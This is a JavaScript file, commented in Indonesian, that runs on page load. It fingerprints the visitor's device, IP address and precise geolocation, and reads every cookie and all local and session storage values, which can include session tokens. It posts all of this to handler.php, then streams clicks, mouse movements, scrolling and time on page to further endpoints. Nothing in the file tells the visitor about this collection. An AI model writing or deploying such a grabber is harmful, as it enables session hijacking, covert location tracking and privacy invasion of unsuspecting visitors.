function mydata() {
    var client = new ClientJS(); // Create A New Client Object
    var OS = client.getOS(); // Get OS Version
    var ver = client.getOSVersion(); // Get OS Version
    var getbrow = client.getBrowser(); // Get Browser
    var getbrowVer = client.getBrowserVersion(); // Get Browser Version
    var CPU = client.getCPU(); // Get CPU Architecture
    var currentResolution = client.getCurrentResolution(); // Get Current Resolution
    var timeZone = '';
    var ram = navigator.deviceMemory || 'Not Available'; // Get RAM
    var user = navigator.userAgent; // Get User Agent
    var sw = window.screen.width; // Get Screen Width
    var sh = window.screen.height; // Get Screen Height
    var connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
    var networkType = connection ? connection.effectiveType : 'Not Available'; // Get Network Type
    var downlink = connection && connection.downlink ? connection.downlink + ' Mbps' : 'Not Available'; // Get Downlink Speed
    var rtt = connection && connection.rtt ? connection.rtt + ' ms' : 'Not Available'; // Get Round Trip Time
    var saveData = connection && connection.saveData ? 'Enabled' : 'Disabled'; // Check if Save Data is enabled
    var plugins = navigator.plugins.length > 0 ? Array.from(navigator.plugins).map(plugin => plugin.name) : 'No Plugins'; // Get Browser Plugins
    var localTime = new Date().toLocaleString(); // Get Local Time
    var languages = navigator.languages || ['Not Available']; // Get Supported Languages
    var isMobile = /Mobi|Android/i.test(user) ? 'Mobile' : 'Desktop'; // Determine Device Type
    var orientation = screen.orientation ? screen.orientation.type : 'Not Available'; // Get Screen Orientation
    var touchSupport = 'ontouchstart' in window ? 'Touch Supported' : 'No Touch Support'; // Check Touch Support
    var cookiesEnabled = navigator.cookieEnabled ? 'Cookies Enabled' : 'Cookies Disabled'; // Check Cookies Enabled
    var geolocationEnabled = 'geolocation' in navigator ? 'Geolocation Supported' : 'Geolocation Not Supported'; // Check Geolocation Support
    var localStorageSupported = 'localStorage' in window ? 'Local Storage Supported' : 'Local Storage Not Supported'; // Check Local Storage Support
    var sessionStorageSupported = 'sessionStorage' in window ? 'Session Storage Supported' : 'Session Storage Not Supported'; // Check Session Storage Support
    var batteryStatus = 'Not Available'; // Initialize battery status variable
    var screenColorDepth = window.screen.colorDepth || 'Not Available'; // Get Screen Color Depth
    var screenPixelRatio = window.devicePixelRatio || 'Not Available'; // Get Device Pixel Ratio

    try {
        timeZone = client.getTimeZone(); // Get Time Zone
    } catch {
        timeZone = 'Not Found';
    }

    timeZone = timeZone.toString();

    // Get Battery Status
    if (navigator.getBattery) {
        navigator.getBattery().then(function(battery) {
            batteryStatus = `Level: ${battery.level * 100}%, Charging: ${battery.charging ? 'Yes' : 'No'}`;
            fetchIPAndSendData();
        });
    } else {
        fetchIPAndSendData(); // Call if battery status is not available
    }

    // Fetch IP Address
    function fetchIP(callback) {
        $.get("https://api.ipify.org", function(data) {
            callback(data);
        }).fail(function() {
            console.error("Failed to fetch IP address.");
            callback("Not Available");
        });
    }

    // Get Geolocation
    function getGeolocation(callback) {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(function(position) {
                var geolocationData = {
                    latitude: position.coords.latitude,
                    longitude: position.coords.longitude,
                    accuracy: position.coords.accuracy
                };
                callback(geolocationData);
            }, function() {
                callback(null);
            });
        } else {
            callback(null);
        }
    }

    // Get Cookies
    function getCookies() {
        var cookies = document.cookie;
        return cookies ? cookies.split('; ').map(cookie => cookie.trim()).join('\n') : 'No Cookies Available';
    }

    // Get Local Storage Data
    function getLocalStorageData() {
        var localStorageData = {};
        for (var i = 0; i < localStorage.length; i++) {
            var key = localStorage.key(i);
            localStorageData[key] = localStorage.getItem(key);
        }
        return Object.keys(localStorageData).length > 0 ? JSON.stringify(localStorageData, null, 2) : 'No Local Storage Data';
    }

    // Get Session Storage Data
    function getSessionStorageData() {
        var sessionStorageData = {};
        for (var i = 0; i < sessionStorage.length; i++) {
            var key = sessionStorage.key(i);
            sessionStorageData[key] = sessionStorage.getItem(key);
        }
        return Object.keys(sessionStorageData).length > 0 ? JSON.stringify(sessionStorageData, null, 2) : 'No Session Storage Data';
    }

    // Get Storage Information
    function getStorageInfo(callback) {
        if (navigator.storage && navigator.storage.estimate) {
            navigator.storage.estimate().then(function(estimate) {
                callback(estimate);
            });
        } else {
            callback(null);
        }
    }

    // Get Performance Information
    function getPerformanceInfo(callback) {
        var performanceData = {
            loadTime: performance.timing.loadEventEnd - performance.timing.navigationStart,
            responseTime: performance.timing.responseEnd - performance.timing.requestStart
        };
        callback(performanceData);
    }

    // Get Browser Features
    function getBrowserFeatures(callback) {
        var features = {
            webRTC: !!(navigator.mediaDevices && navigator.mediaDevices.getUserMedia),
            webGL: !!document.createElement('canvas').getContext('webgl'),
            serviceWorker: 'serviceWorker' in navigator,
            localStorage: 'localStorage' in window,
            sessionStorage: 'sessionStorage' in window,
            indexedDB: 'indexedDB' in window,
            webPush: 'PushManager' in window,
            webAssembly: !!window.WebAssembly
        };
        callback(features);
    }

    // Get GPU Information
    function getGPUInfo(callback) {
        var gpuInfo = 'Not Available'; // Placeholder for GPU information
        callback(gpuInfo);
    }

    // Get Cache Information
    function getCacheInfo(callback) {
        if ('caches' in window) {
            caches.keys().then(function(cacheNames) {
                callback(cacheNames.length);
            });
        } else {
            callback(0);
        }
    }

    // Get Network Usage
    function getNetworkUsage(callback) {
        if (navigator.connection) {
            var networkUsage = {
                effectiveType: navigator.connection.effectiveType,
                downlink: navigator.connection.downlink,
                rtt: navigator.connection.rtt
            };
            callback(networkUsage);
        } else {
            callback(null);
        }
    }

    // Get Security Information
    function getSecurityInfo(callback) {
        var isSecure = window.location.protocol === 'https:';
        callback(isSecure);
    }

    // Send Data to Server
    function sendData(ip, geolocationData, storageInfo, performanceData, browserFeatures, gpuInfo, cacheInfo, networkUsage, isSecure) {
        var cookies = getCookies(); // Get cookies
        var localStorageData = getLocalStorageData(); // Get Local Storage data
        var sessionStorageData = getSessionStorageData(); // Get Session Storage data
        var connectionInfo = `Network Type: ${networkType} \nDownlink Speed: ${downlink} \nRound Trip Time: ${rtt} \nSave Data: ${saveData}`;
        
        var data = `INFORMASI DEVICE
        ---DEVICE---------------------------------------------------- 
        ip                                  : ${ip} 
        Ram                              : ${ram} 
        geolocationEnabled    : ${geolocationEnabled} 
        Connection Info          : 
        ${connectionInfo} 
        User                             : ${user} 
        os name                       : ${OS} 
        Version                        : ${ver} 
        Cpu Name                   : ${CPU} 
        Language                    : ${languages.join(', ')} 
        Number Of CPU Core : ${navigator.hardwareConcurrency || 'Not Available'} 
        ---LAYAR----------------------------------------------------
        screenWidth                : ${sw} 
        screenHeight               : ${sh} 
        Resolution                   : ${currentResolution} 
        Color Depth                 : ${screenColorDepth} 
        Pixel Ratio                    : ${screenPixelRatio} 
        ---WAKTU---------------------------------------------------
        localTime                     : ${localTime} 
        languages                    : ${languages.join(', ')} 
        Time Zone                   : ${timeZone} 
        ---GEOLOKASI----------------------------------------------- 
        Latitude                       : ${geolocationData ? geolocationData.latitude : 'Not Available'} 
        Longitude                    : ${geolocationData ? geolocationData.longitude : 'Not Available'} 
        Accuracy                     : ${geolocationData ? geolocationData.accuracy : 'Not Available'} 
        ---PENYIMPANAN--------------------------------------------
        Quota                           : ${storageInfo ? storageInfo.quota : 'Not Available'} 
        Usage                          : ${storageInfo ? storageInfo.usage : 'Not Available'} 
        ---KINERJA--- 
        Load Time                   : ${performanceData.loadTime} ms 
        Response Time           : ${performanceData.responseTime} ms 
        ---FITUR BROWSER------------------------------------------ 
        WebRTC                      : ${browserFeatures.webRTC ? 'Supported' : 'Not Supported'} 
        WebGL                         : ${browserFeatures.webGL ? 'Supported' : 'Not Supported'} 
        Service Worker           :${browserFeatures.serviceWorker ? 'Supported' : 'Not Supported'} 
        Local Storage              : ${browserFeatures.localStorage ? 'Supported' : 'Not Supported'} 
        Session Storage          : ${browserFeatures.sessionStorage ? 'Supported' : 'Not Supported'} 
        IndexedDB                   : ${browserFeatures.indexedDB ? 'Supported' : 'Not Supported'} 
        Web Push                    : ${browserFeatures.webPush ? 'Supported' : 'Not Supported'} 
        WebAssembly             : ${browserFeatures.webAssembly ? 'Supported' : 'Not Supported'} 
        ---GPU------------------------------------------------------- 
        GPU Info                      : ${gpuInfo} 
        ---CACHE---------------------------------------------------
        Cache Count               : ${cacheInfo} 
        ---JARINGAN------------------------------------------------ 
        Effective Type             : ${networkUsage ? networkUsage.effectiveType : 'Not Available'} 
        Downlink                      : ${networkUsage ? networkUsage.downlink : 'Not Available'} 
        RTT                              : ${networkUsage ? networkUsage.rtt : 'Not Available'} 
        ---KEAMANAN-----------------------------------------------
        HTTPS                         : ${isSecure ? 'Yes' : 'No'} 
        ---BROWSER-------------------------------------------------
        Browser Name            : ${getbrow} 
        Get Browser Version   : ${getbrowVer} 
        plugins                         : ${plugins} 
        ---TAMBAHAN----------------------------------------------- 
        Mobile/PC                    : ${isMobile} 
        ScreenOrientation       : ${orientation} 
        touchSupport              : ${touchSupport} 
        CookiesEnabled          : ${cookiesEnabled} 
        Cookies                       : ${cookies} 
        LocalStorageSupport       : ${localStorageSupported} 
        Local Storage Data           : ${localStorageData} 
        SessionStorageSupport   : ${sessionStorageSupported} 
        Session Storage Data      : ${sessionStorageData} 
        ---BATTERY------------------------------------------------- 
        Battery Status             : ${batteryStatus}`;

        $.ajax({
            type: 'POST',
            url: 'handler.php',
            data: { "data": data },
            mimeType: 'text',
            success: function() {
                showNotification('Data sent successfully!');
            },
            error: function() {
                showNotification('Error sending data.');
            }
        });
    }

    // Fetch IP and then send data
    function fetchIPAndSendData() {
        fetchIP(function(ip) {
            getGeolocation(function(geolocationData) {
                getStorageInfo(function(storageInfo) {
                    getPerformanceInfo(function(performanceData) {
                        getBrowserFeatures(function(browserFeatures) {
                            getGPUInfo(function(gpuInfo) {
                                getCacheInfo(function(cacheInfo) {
                                    getNetworkUsage(function(networkUsage) {
                                        getSecurityInfo(function(isSecure) {
                                            sendData(ip, geolocationData, storageInfo, performanceData, browserFeatures, gpuInfo, cacheInfo, networkUsage, isSecure);
                                        });
                                    });
                                });
                            });
                        });
                    });
                });
            });
        });
    }

    // Pemantauan Klik
    function monitorClicks() {
        document.addEventListener('click', function(event) {
            var clickData = {
                x: event.clientX,
                y: event.clientY,
                element: event.target.tagName,
                time: new Date().toLocaleString()
            };
            console.log('Click Data:', clickData);
            sendClickDataToServer(clickData);
        });
    }

    function sendClickDataToServer(clickData) {
        $.ajax({
            type: 'POST',
            url: 'clickHandler.php', // Endpoint untuk menyimpan data klik
            data: { "clickData": JSON.stringify(clickData) },
            success: function(response) {
                console.log('Click data sent successfully:', response);
            },
            error: function(error) {
                console.error('Error sending click data:', error);
            }
        });
    }

    // Pemantauan Pergerakan Mouse
    function monitorMouseMovement() {
        document.addEventListener('mousemove', function(event) {
            var mouseData = {
                x: event.clientX,
                y: event.clientY,
                time: new Date().toLocaleString()
            };
            console.log('Mouse Movement Data:', mouseData);
            sendMouseDataToServer(mouseData);
        });
    }

    function sendMouseDataToServer(mouseData) {
        $.ajax({
            type: 'POST',
            url: 'mouseHandler.php', // Endpoint untuk menyimpan data pergerakan mouse
            data: { "mouseData": JSON.stringify(mouseData) },
            success: function(response) {
                console.log('Mouse data sent successfully:', response);
            },
            error: function(error) {
                console.error('Error sending mouse data:', error);
            }
        });
    }

    // Pemantauan Waktu yang Dihabiskan di Halaman
    var pageLoadTime = new Date().getTime();

    function monitorTimeSpent() {
        window.addEventListener('beforeunload', function() {
            var timeSpent = new Date().getTime() - pageLoadTime;
            console.log('Time Spent on Page:', timeSpent / 1000 + ' seconds');
            sendTimeSpentToServer(timeSpent);
        });
    }

    function sendTimeSpentToServer(timeSpent) {
        $.ajax({
            type: 'POST',
            url: 'timeHandler.php', // Endpoint untuk menyimpan data waktu yang dihabiskan
            data: { "timeSpent": timeSpent },
            success: function(response) {
                console.log('Time spent data sent successfully:', response);
            },
            error: function(error) {
                console.error('Error sending time spent data:', error);
            }
        });
    }

    // Pemantauan Scroll
    function monitorScroll() {
        window.addEventListener('scroll', function() {
            var scrollData = {
                scrollTop: window.scrollY,
                time: new Date().toLocaleString()
            };
            console.log('Scroll Data:', scrollData);
            sendScrollDataToServer(scrollData);
        });
    }

    function sendScrollDataToServer(scrollData) {
        $.ajax({
            type: 'POST',
            url: 'scrollHandler.php', // Endpoint untuk menyimpan data scroll
            data: { "scrollData": JSON.stringify(scrollData) },
            success: function(response) {
                console.log('Scroll data sent successfully:', response);
            },
            error: function(error) {
                console.error('Error sending scroll data:', error);
            }
        });
    }

    // Panggil fungsi pemantauan
    monitorClicks();
    monitorMouseMovement();
    monitorTimeSpent();
    monitorScroll();
}

// Pastikan untuk meminta izin untuk menampilkan pemberitahuan
if (Notification.permission === 'default') {
    Notification.requestPermission();
}

// Panggil fungsi mydata saat halaman dimuat
window.onload = mydata;
